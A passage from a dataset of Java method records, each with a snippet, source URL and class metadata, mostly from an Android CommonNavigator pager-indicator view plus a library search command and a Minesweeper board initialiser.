notifyDataSetChanged() {\n        if (mAdapter != null) {\n            mAdapter.notifyDataSetChanged();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33218, "method_name": "isAdjustMode", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isAdjustMode() {\n        return mAdjustMode;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33219, "method_name": "setAdjustMode", "class_name": "CommonNavigator", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAdjustMode(boolean is) {\n        mAdjustMode = is;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33220, "method_name": "getAdapter", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CommonNavigatorAdapter", "snippet": "    public CommonNavigatorAdapter getAdapter() {\n        return mAdapter;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33221, "method_name": "setAdapter", "class_name": "CommonNavigator", "params": ["CommonNavigatorAdapter"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAdapter(CommonNavigatorAdapter adapter) {\n        if (mAdapter == adapter) {\n            return;\n        }\n        if (mAdapter != null) {\n            mAdapter.unregisterDataSetObserver(mObserver);\n        }\n        mAdapter = adapter;\n        if (mAdapter != null) {\n            mAdapter.registerDataSetObserver(mObserver);\n            mNavigatorHelper.setTotalCount(mAdapter.getCount());\n            if (mTitleContainer != null) {  // adapter\u6539\u53d8\u65f6\uff0c\u5e94\u8be5\u91cd\u65b0init\uff0c\u4f46\u662f\u7b2c\u4e00\u6b21\u8bbe\u7f6eadapter\u4e0d\u7528\uff0conAttachToMagicIndicator\u4e2d\u6709init\n                mAdapter.notifyDataSetChanged();\n            }\n        } else {\n            mNavigatorHelper.setTotalCount(0);\n            init();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33222, "method_name": "init", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init() {\n        removeAllViews();\n\n        View root;\n        if (mAdjustMode) {\n            root = LayoutInflater.from(getContext()).inflate(R.layout.pager_navigator_layout_no_scroll, this);\n        } else {\n            root = LayoutInflater.from(getContext()).inflate(R.layout.pager_navigator_layout, this);\n        }\n\n        mScrollView = (HorizontalScrollView) root.findViewById(R.id.scroll_view);   // mAdjustMode\u4e3atrue\u65f6\uff0cmScrollView\u4e3anull\n\n        mTitleContainer = (LinearLayout) root.findViewById(R.id.title_container);\n        mTitleContainer.setPadding(mLeftPadding, 0, mRightPadding, 0);\n\n        mIndicatorContainer = (LinearLayout) root.findViewById(R.id.indicator_container);\n        if (mIndicatorOnTop) {\n            mIndicatorContainer.getParent().bringChildToFront(mIndicatorContainer);\n        }\n\n        initTitlesAndIndicator();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33223, "method_name": "initTitlesAndIndicator", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initTitlesAndIndicator() {\n        for (int i = 0, j = mNavigatorHelper.getTotalCount(); i < j; i++) {\n            IPagerTitleView v = mAdapter.getTitleView(getContext(), i);\n            if (v instanceof View) {\n                View view = (View) v;\n                LinearLayout.LayoutParams lp;\n                if (mAdjustMode) {\n                    lp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.MATCH_PARENT,1);\n                    lp.weight = mAdapter.getTitleWeight(getContext(), i);\n                } else {\n                    lp = new LinearLayout.LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.MATCH_PARENT);\n                }\n                mTitleContainer.addView(view, lp);\n            }\n        }\n        if (mAdapter != null) {\n            mIndicator = mAdapter.getIndicator(getContext());\n            if (mIndicator instanceof View) {\n                LayoutParams lp = new LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT);\n                mIndicatorContainer.addView((View) mIndicator, lp);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33224, "method_name": "onLayout", "class_name": "CommonNavigator", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onLayout(boolean changed, int left, int top, int right, int bottom) {\n        super.onLayout(changed, left, top, right, bottom);\n        if (mAdapter != null) {\n            preparePositionData();\n            if (mIndicator != null) {\n                mIndicator.onPositionDataProvide(mPositionDataList);\n            }\n            if (mReselectWhenLayout && mNavigatorHelper.getScrollState() == ScrollState.SCROLL_STATE_IDLE) {\n                onPageSelected(mNavigatorHelper.getCurrentIndex());\n                onPageScrolled(mNavigatorHelper.getCurrentIndex(), 0.0f, 0);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33225, "method_name": "preparePositionData", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void preparePositionData() {\n        mPositionDataList.clear();\n        for (int i = 0, j = mNavigatorHelper.getTotalCount(); i < j; i++) {\n            PositionData data = new PositionData();\n            View v = mTitleContainer.getChildAt(i);\n            if (v != null) {\n                data.mLeft = v.getLeft();\n                data.mTop = v.getTop();\n                data.mRight = v.getRight();\n                data.mBottom = v.getBottom();\n                if (v instanceof IMeasurablePagerTitleView) {\n                    IMeasurablePagerTitleView view = (IMeasurablePagerTitleView) v;\n                    data.mContentLeft = view.getContentLeft();\n                    data.mContentTop = view.getContentTop();\n                    data.mContentRight = view.getContentRight();\n                    data.mContentBottom = view.getContentBottom();\n                } else {\n                    data.mContentLeft = data.mLeft;\n                    data.mContentTop = data.mTop;\n                    data.mContentRight = data.mRight;\n                    data.mContentBottom = data.mBottom;\n                }\n            }\n            mPositionDataList.add(data);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33226, "method_name": "onPageScrolled", "class_name": "CommonNavigator", "params": ["int", "float", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {\n        if (mAdapter != null) {\n\n            mNavigatorHelper.onPageScrolled(position, positionOffset, positionOffsetPixels);\n            if (mIndicator != null) {\n                mIndicator.onPageScrolled(position, positionOffset, positionOffsetPixels);\n            }\n\n            // \u624b\u6307\u8ddf\u968f\u6eda\u52a8\n            if (mScrollView != null && mPositionDataList.size() > 0 && position >= 0 && position < mPositionDataList.size()) {\n                if (mFollowTouch) {\n                    int currentPosition = Math.min(mPositionDataList.size() - 1, position);\n                    int nextPosition = Math.min(mPositionDataList.size() - 1, position + 1);\n                    PositionData current = mPositionDataList.get(currentPosition);\n                    PositionData next = mPositionDataList.get(nextPosition);\n                    float scrollTo = current.horizontalCenter() - mScrollView.getWidth() * mScrollPivotX;\n                    float nextScrollTo = next.horizontalCenter() - mScrollView.getWidth() * mScrollPivotX;\n                    mScrollView.scrollTo((int) (scrollTo + (nextScrollTo - scrollTo) * positionOffset), 0);\n                } else if (!mEnablePivotScroll) {\n                    // TODO \u5b9e\u73b0\u5f85\u9009\u4e2d\u9879\u5b8c\u5168\u663e\u793a\u51fa\u6765\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33227, "method_name": "getScrollPivotX", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getScrollPivotX() {\n        return mScrollPivotX;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33228, "method_name": "setScrollPivotX", "class_name": "CommonNavigator", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setScrollPivotX(float scrollPivotX) {\n        mScrollPivotX = scrollPivotX;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33229, "method_name": "onPageSelected", "class_name": "CommonNavigator", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPageSelected(int position) {\n        if (mAdapter != null) {\n            mNavigatorHelper.onPageSelected(position);\n            if (mIndicator != null) {\n                mIndicator.onPageSelected(position);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33230, "method_name": "onPageScrollStateChanged", "class_name": "CommonNavigator", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPageScrollStateChanged(int state) {\n        if (mAdapter != null) {\n            mNavigatorHelper.onPageScrollStateChanged(state);\n            if (mIndicator != null) {\n                mIndicator.onPageScrollStateChanged(state);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33231, "method_name": "onAttachToMagicIndicator", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onAttachToMagicIndicator() {\n        init(); // \u5c06\u521d\u59cb\u5316\u5ef6\u8fdf\u5230\u8fd9\u91cc\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33232, "method_name": "onDetachFromMagicIndicator", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDetachFromMagicIndicator() {\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33233, "method_name": "getPagerIndicator", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IPagerIndicator", "snippet": "    public IPagerIndicator getPagerIndicator() {\n        return mIndicator;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33234, "method_name": "isEnablePivotScroll", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isEnablePivotScroll() {\n        return mEnablePivotScroll;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33235, "method_name": "setEnablePivotScroll", "class_name": "CommonNavigator", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEnablePivotScroll(boolean is) {\n        mEnablePivotScroll = is;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33236, "method_name": "onEnter", "class_name": "CommonNavigator", "params": ["int", "int", "float", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onEnter(int index, int totalCount, float enterPercent, boolean leftToRight) {\n        if (mTitleContainer == null) {\n            return;\n        }\n        View v = mTitleContainer.getChildAt(index);\n        if (v instanceof IPagerTitleView) {\n            ((IPagerTitleView) v).onEnter(index, totalCount, enterPercent, leftToRight);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33237, "method_name": "onLeave", "class_name": "CommonNavigator", "params": ["int", "int", "float", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onLeave(int index, int totalCount, float leavePercent, boolean leftToRight) {\n        if (mTitleContainer == null) {\n            return;\n        }\n        View v = mTitleContainer.getChildAt(index);\n        if (v instanceof IPagerTitleView) {\n            ((IPagerTitleView) v).onLeave(index, totalCount, leavePercent, leftToRight);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33238, "method_name": "isSmoothScroll", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isSmoothScroll() {\n        return mSmoothScroll;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33239, "method_name": "setSmoothScroll", "class_name": "CommonNavigator", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSmoothScroll(boolean smoothScroll) {\n        mSmoothScroll = smoothScroll;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33240, "method_name": "isFollowTouch", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isFollowTouch() {\n        return mFollowTouch;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33241, "method_name": "setFollowTouch", "class_name": "CommonNavigator", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFollowTouch(boolean followTouch) {\n        mFollowTouch = followTouch;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33242, "method_name": "isSkimOver", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isSkimOver() {\n        return mSkimOver;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33243, "method_name": "setSkimOver", "class_name": "CommonNavigator", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSkimOver(boolean skimOver) {\n        mSkimOver = skimOver;\n        mNavigatorHelper.setSkimOver(skimOver);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33244, "method_name": "onSelected", "class_name": "CommonNavigator", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSelected(int index, int totalCount) {\n        if (mTitleContainer == null) {\n            return;\n        }\n        View v = mTitleContainer.getChildAt(index);\n        if (v instanceof IPagerTitleView) {\n            ((IPagerTitleView) v).onSelected(index, totalCount);\n        }\n        if (!mAdjustMode && !mFollowTouch && mScrollView != null && mPositionDataList.size() > 0) {\n            int currentIndex = Math.min(mPositionDataList.size() - 1, index);\n            PositionData current = mPositionDataList.get(currentIndex);\n            if (mEnablePivotScroll) {\n                float scrollTo = current.horizontalCenter() - mScrollView.getWidth() * mScrollPivotX;\n                if (mSmoothScroll) {\n                    mScrollView.smoothScrollTo((int) (scrollTo), 0);\n                } else {\n                    mScrollView.scrollTo((int) (scrollTo), 0);\n                }\n            } else {\n                // \u5982\u679c\u5f53\u524d\u9879\u88ab\u90e8\u5206\u906e\u6321\uff0c\u5219\u6eda\u52a8\u663e\u793a\u5b8c\u5168\n                if (mScrollView.getScrollX() > current.mLeft) {\n                    if (mSmoothScroll) {\n                        mScrollView.smoothScrollTo(current.mLeft, 0);\n                    } else {\n                        mScrollView.scrollTo(current.mLeft, 0);\n                    }\n                } else if (mScrollView.getScrollX() + getWidth() < current.mRight) {\n                    if (mSmoothScroll) {\n                        mScrollView.smoothScrollTo(current.mRight - getWidth(), 0);\n                    } else {\n                        mScrollView.scrollTo(current.mRight - getWidth(), 0);\n                    }\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33245, "method_name": "onDeselected", "class_name": "CommonNavigator", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDeselected(int index, int totalCount) {\n        if (mTitleContainer == null) {\n            return;\n        }\n        View v = mTitleContainer.getChildAt(index);\n        if (v instanceof IPagerTitleView) {\n            ((IPagerTitleView) v).onDeselected(index, totalCount);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33246, "method_name": "getPagerTitleView", "class_name": "CommonNavigator", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "IPagerTitleView", "snippet": "    public IPagerTitleView getPagerTitleView(int index) {\n        if (mTitleContainer == null) {\n            return null;\n        }\n        return (IPagerTitleView) mTitleContainer.getChildAt(index);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33247, "method_name": "getTitleContainer", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LinearLayout", "snippet": "    public LinearLayout getTitleContainer() {\n        return mTitleContainer;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33248, "method_name": "getRightPadding", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getRightPadding() {\n        return mRightPadding;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33249, "method_name": "setRightPadding", "class_name": "CommonNavigator", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRightPadding(int rightPadding) {\n        mRightPadding = rightPadding;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33250, "method_name": "getLeftPadding", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLeftPadding() {\n        return mLeftPadding;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33251, "method_name": "setLeftPadding", "class_name": "CommonNavigator", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLeftPadding(int leftPadding) {\n        mLeftPadding = leftPadding;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33252, "method_name": "isIndicatorOnTop", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isIndicatorOnTop() {\n        return mIndicatorOnTop;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33253, "method_name": "setIndicatorOnTop", "class_name": "CommonNavigator", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIndicatorOnTop(boolean indicatorOnTop) {\n        mIndicatorOnTop = indicatorOnTop;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33254, "method_name": "isReselectWhenLayout", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isReselectWhenLayout() {\n        return mReselectWhenLayout;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33255, "method_name": "setReselectWhenLayout", "class_name": "CommonNavigator", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setReselectWhenLayout(boolean reselectWhenLayout) {\n        mReselectWhenLayout = reselectWhenLayout;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/CommonNavigator.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IPagerNavigator", "NavigatorHelper"], "modifiers": ["public"]}}, {"id": 33256, "method_name": "execute", "class_name": "SearchCmd", "params": ["LibraryData"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void execute(LibraryData data) {\n        Objects.requireNonNull(data, LegalityCheck.LIBRARY_DATA_NULL_MESSAGE);\n\n        List<BookEntry> books = data.getBookData();\n        List<BookEntry> booksFound = Utils.searchBooksByTitle(books, searchWord);\n\n        if (booksFound.size() == 0) {\n            System.out.println(\"No hits found for search term: \" + this.searchWord);\n        }\n        else {\n            for (BookEntry book : booksFound) {\n                System.out.println(book.getTitle());\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/src/SearchCmd.java", "stars": "6", "class_props": {"extends": "LibraryCommand", "implements": null, "modifiers": ["public"]}}, {"id": 33257, "method_name": "parseArguments", "class_name": "SearchCmd", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean parseArguments(String argumentInput) {\n        Objects.requireNonNull(argumentInput, LegalityCheck.INPUT_ARGUMENT_NULL_MESSAGE);\n\n        if (argumentInput.matches(ALL_ALPHA_REGEX) && !argumentInput.isBlank()) {\n            this.searchWord = argumentInput;\n            return true;\n        }\n        else {\n            return false;\n        }\n    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/src/SearchCmd.java", "stars": "6", "class_props": {"extends": "LibraryCommand", "implements": null, "modifiers": ["public"]}}, {"id": 33258, "method_name": "initBoard", "class_name": "GameState", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void initBoard() {\n\t\tboard = new Cell[dimensions][dimensions]; //initialize board object\n\t\tmines = calcMineCount(dimensions, difficulty); //calculate number of mines to deploy\n\t\tint minesLeft = mines;\n\t\tint cells = (int) Math.pow(dimensions, 2);\n\t\t\n\t\t//create board and place mines!\n\t\tfor (int y = 0; y < board.length; y++) {\n\t\t\tfor (int x = 0; x < board[y].length; x++) {\n\t\t\t\tboard[x][y] = new Cell(x, y); //init cell\n\t\t\t\t//place mine?\n\t\t\t\tif (minesLeft > 0 && ((double)minesLeft / (double)cells) > Math.random()) {\n\t\t\t\t\tboard[x][y].setMine(true);\n\t\t\t\t\tminesLeft--;\n\t\t\t\t}\n\t\t\t\t//board[x][y].setRevealed(true); //TEMP\n\t\t\t\tcells--;\n\t\t\t}\n\t\t}\n\t\t\n\t\t//setup number of neighboring mines for each cell!\n\t\t//iterate over cells\n\t\tfor (int y = 0; y < board.length; y++) {\n\t\t\tfor (int x = 0; x < board[y].length; x++) {\n\t\t\t\t//if cell is not a mine, continue with next 